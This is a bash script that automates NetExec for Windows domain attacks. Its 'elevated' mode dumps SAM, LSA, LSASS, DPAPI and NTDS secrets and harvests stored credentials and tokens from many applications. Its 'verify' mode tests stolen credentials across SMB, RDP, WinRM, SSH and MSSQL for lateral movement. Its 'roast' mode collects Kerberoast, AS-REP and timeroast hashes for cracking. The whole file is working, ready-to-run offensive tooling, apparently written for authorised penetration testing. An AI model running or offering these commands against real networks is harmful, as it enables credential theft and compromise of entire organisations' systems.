#!/usr/bin/env bash

# ───────── Colors ──────────
C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
YELLOW="${C}[1;33m"
BLUE="${C}[1;34m"
NC="${C}[0m"

# ───────── Usage ──────────
usage() {
  echo -e "${YELLOW}Usage:${NC} $0 <mode> <target> -u <user> (-p <pass> | -H <hash> | --aesKey <key> --kdcHost <dc>) [-o <output-dir>] [--local-auth]"
  echo ""
  echo "  <mode>        elevated | verify | roast"
  echo "                  elevated: Requires elevated privileges (local admin+) to extract credentials and interesting information for lateral movement"
  echo "  <target>      Single IP or CIDR (or DC for roast mode)"
  echo "  -u            Username"
  echo "  -p            Password"
  echo "  -H            NTLM hash"
  echo "  --aesKey      Kerberos AES key (requires --kdcHost)"
  echo "  --kdcHost     Domain Controller to contact (used with --aesKey)"
  echo "  -o            Output directory (optional, will be created if it doesn't exist)"
  echo "  --local-auth  Specify if it's a local account (ignored with --aesKey)"
  echo "  -h            Show this help"
  exit 1
}

# ───────── Parse Arguments ──────────
MODE="$1"
shift
TARGET="$1"
shift

LOCAL_AUTH=0
AESKEY=""
KDCHOST=""

# Pre-scan args for long options
for arg in "$@"; do
  case "$arg" in
  --local-auth)
    LOCAL_AUTH=1
    set -- "${@/--local-auth/}"
    ;;
  --aesKey) AESKEY_SET=1 ;;
  --kdcHost) KDCHOST_SET=1 ;;
  esac
done

while [[ $# -gt 0 ]]; do
  case "$1" in
  -u)
    USER="$2"
    shift 2
    ;;
  -p)
    PASS="$2"
    shift 2
    ;;
  -H)
    HASH="$2"
    shift 2
    ;;
  --aesKey)
    AESKEY="$2"
    shift 2
    ;;
  --kdcHost)
    KDCHOST="$2"
    shift 2
    ;;
  -o)
    OUTDIR="$2"
    shift 2
    ;;
  -h) usage ;;
  *) shift ;;
  esac
done

# ───────── Validate Arguments ──────────
if [[ -z "$MODE" || -z "$TARGET" || -z "$USER" ]]; then
  usage
fi

if [[ "$MODE" != "elevated" && "$MODE" != "verify" && "$MODE" != "roast" ]]; then
  echo -e "${RED}[-] Mode must be one of: elevated, verify, roast${NC}"
  usage
fi

# auth validation
if [[ -n "$AESKEY" || -n "$KDCHOST" ]]; then
  if [[ -z "$AESKEY" || -z "$KDCHOST" ]]; then
    echo -e "${RED}[-] --aesKey requires --kdcHost and vice versa${NC}"
    usage
  fi
  if [[ -n "$PASS" || -n "$HASH" ]]; then
    echo -e "${RED}[-] Cannot use --aesKey with -p or -H${NC}"
    usage
  fi
else
  if [[ -z "$PASS" && -z "$HASH" ]]; then
    echo -e "${RED}[-] Must specify either -p, -H, or --aesKey+--kdcHost${NC}"
    usage
  elif [[ -n "$PASS" && -n "$HASH" ]]; then
    echo -e "${RED}[-] Specify only one of -p or -H${NC}"
    usage
  fi
fi

if [[ -n "$OUTDIR" ]]; then
  if [[ "$MODE" == "verify" ]]; then
    LOGFILE="$OUTDIR"/"${USER}_${MODE}.log"
  else
    LOGFILE="$OUTDIR"/"${TARGET}_${MODE}.log"
  fi

  if [[ "$MODE" == "elevated" ]]; then
    CREDFILE="$OUTDIR"/"${TARGET}_creds.log"
    INTERESTINGFILE="$OUTDIR"/"${TARGET}_interesting.log"
  fi

  mkdir -p "$OUTDIR"
  touch "$LOGFILE"
fi

log() {
  local msg="$1"
  local additional_file="$2"
  
  if [[ -n "$LOGFILE" ]]; then
    if [[ -n "$additional_file" ]]; then
      echo -e "${BLUE}[+]${NC} $msg" | tee -a "$LOGFILE" | tee -a "$additional_file"
    else
      echo -e "${BLUE}[+]${NC} $msg" | tee -a "$LOGFILE"
    fi
  else
    echo -e "${BLUE}[+]${NC} $msg"
  fi
}

run_nxc() {
  log "Running: $*"
  if [[ -n "$LOGFILE" ]]; then
    unbuffer $* | tee -a "$LOGFILE"
  else
    unbuffer $*
  fi
}

run_nxc_creds() {
  log "Running: $*" "$CREDFILE"
  if [[ -n "$LOGFILE" && -n "$CREDFILE" ]]; then
    unbuffer $* | tee -a "$LOGFILE" | tee -a "$CREDFILE"
  elif [[ -n "$LOGFILE" ]]; then
    unbuffer $* | tee -a "$LOGFILE"
  else
    unbuffer $*
  fi
}

run_nxc_interesting() {
  log "Running: $*" "$INTERESTINGFILE"
  if [[ -n "$LOGFILE" && -n "$INTERESTINGFILE" ]]; then
    unbuffer $* | tee -a "$LOGFILE" | tee -a "$INTERESTINGFILE"
  elif [[ -n "$LOGFILE" ]]; then
    unbuffer $* | tee -a "$LOGFILE"
  else
    unbuffer $*
  fi
}

# build base auth flags
BASE_AUTH_ARGS="-u $USER"
if [[ -n "$PASS" ]]; then
  BASE_AUTH_ARGS+=" -p $PASS"
elif [[ -n "$HASH" ]]; then
  BASE_AUTH_ARGS+=" -H $HASH"
elif [[ -n "$AESKEY" ]]; then
  BASE_AUTH_ARGS+=" --aesKey $AESKEY --kdcHost $KDCHOST"
fi

AUTH_ARGS="$BASE_AUTH_ARGS"
if [[ $LOCAL_AUTH -eq 1 && -z "$AESKEY" ]]; then
  AUTH_ARGS+=" --local-auth"
fi

# ───────── Mode Logic ──────────
case "$MODE" in
elevated)
  log "Starting credential and information collection…"
  
  # Credential extraction commands
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --sam
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M lsassy
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --lsa
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --dpapi
  
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M wifi
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M winscp
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M rdcman
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS --sccm
  run_nxc_creds nxc smb "$TARGET" $AUTH_ARGS -M ntdsutil
  log "Running: nxc smb $TARGET $AUTH_ARGS --ntds" "$CREDFILE"
  if [[ -n "$LOGFILE" && -n "$CREDFILE" ]]; then
    script -efqa "$LOGFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds" | tee -a "$CREDFILE"
  else
    printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds
  fi
  
  # Interesting information commands
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M bitlocker
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M keepass_discover
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M recent_files
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M snipped
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M runasppl
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M powershell_history
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M powershell_history -o EXPORT=True # The flag migth not work - remove if so
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M iis
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS --qwinsta
  log "Look at \"Impersonate logged-on User\" section in wiki in case of found sessions" "$INTERESTINGFILE"
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M impersonate
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M notepad
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M notepad++
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M eventlog_creds
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M wam # Azure and M365 tokens
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M veeam
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M putty
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M vnc
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M mremoteng
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M teams_localdb
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M security-questions
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M wcc # Security conf
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M get_netconnections
  run_nxc_interesting nxc smb "$TARGET" $AUTH_ARGS -M mobaxterm


  if [[ -n "$OUTDIR" ]]; then
    log "Extracting potential credential lines…"
    CREDFILE_PARSED="$OUTDIR"/"${TARGET}_creds_parsed.txt"
    awk '{for (i=5; i<=NF; i++) printf $i (i<NF ? OFS : ORS)}' "$CREDFILE" |
      rg -a '^\x1b\[1;33m|^Node' |
      sed -r 's/\x1b\[[0-9;]*m//g' |
      sort -u >"$CREDFILE_PARSED"

    # Check for GMSA account
    if grep -qF "SC_GMSA" "$CREDFILE"; then
      GMSA_MSG="GMSA Account found! See Extract gMSA Secrets in wiki"
      echo -e "${BLUE}[+]${NC} $GMSA_MSG" | tee -a "$LOGFILE" | tee -a "$CREDFILE_PARSED"
    fi

    echo -e "${GREEN}[✓] Raw output:           ${LOGFILE}"
    echo -e "${GREEN}[✓] Credentials (raw):    ${CREDFILE}"
    echo -e "${GREEN}[✓] Credentials (parsed): ${CREDFILE_PARSED}"
    echo -e "${GREEN}[✓] Interesting info:     ${INTERESTINGFILE}"
  fi
  ;;

verify)
  log "Starting service verification…"
  run_nxc nxc smb "$TARGET" $AUTH_ARGS --shares
  run_nxc nxc rdp "$TARGET" $BASE_AUTH_ARGS
  run_nxc nxc winrm "$TARGET" $BASE_AUTH_ARGS
  run_nxc nxc ssh "$TARGET" $BASE_AUTH_ARGS
  run_nxc nxc mssql "$TARGET" $BASE_AUTH_ARGS

  if [[ -n "$LOGFILE" ]]; then
    sed 's/\r/\n/g' "$LOGFILE" | rg -v Running >"$LOGFILE.tmp" && mv "$LOGFILE.tmp" "$LOGFILE"
    echo -e "${GREEN}[✓] Logfile output:       ${LOGFILE}"
  fi
  ;;

roast)
  log "Starting kerberoast & asreproast…"
  if [[ -n "$OUTDIR" ]]; then
    run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --kerberoasting "$OUTDIR/kerberoast.hash"
    run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --asreproast "$OUTDIR/asrep.hash"
    run_nxc nxc smb "$TARGET" -M timeroast "$OUTDIR/timeroast.hash"
    echo -e "${GREEN}[✓] Kerberoast hashes:    $OUTDIR/kerberoast.hash"
    echo -e "${GREEN}[✓] ASREProast hashes:    $OUTDIR/asrep.hash"
  else
    run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --kerberoasting /dev/stdout
    run_nxc nxc ldap "$TARGET" $BASE_AUTH_ARGS --kdcHost "$TARGET" --asreproast /dev/stdout
    run_nxc nxc smb "$TARGET" -M timeroast /dev/stdout
  fi
  ;;
esac
